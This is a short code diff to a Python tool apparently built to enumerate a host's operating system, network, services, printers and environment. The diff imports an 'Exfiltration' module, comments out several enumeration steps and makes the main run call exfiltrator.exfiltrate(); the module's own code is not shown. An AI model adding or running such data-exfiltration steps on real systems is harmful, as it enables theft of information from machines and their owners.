@@ -7,6 +7,7 @@ from modules.services import Services
 from modules.printers import Printers
 from modules.logger import Logger
 from modules.environments import Environments
+from modules.exfiltrator import Exfiltration
 
 class LCS(object):
     """main class"""
@@ -17,6 +18,7 @@ class LCS(object):
     services = Services()
     printers = Printers()
     environments = Environments()
+    exfiltrator = Exfiltration()
 
     def __init__(self):
         self.main()
@@ -33,8 +35,9 @@ class LCS(object):
         default run method
         """
         self.op_sys.run()
-        self.networking.run()
-        self.services.run()
-        self.environments.run()
+        # self.networking.run()
+        # self.services.run()
+        # self.environments.run()
+        self.exfiltrator.exfiltrate()
 
 LCS()
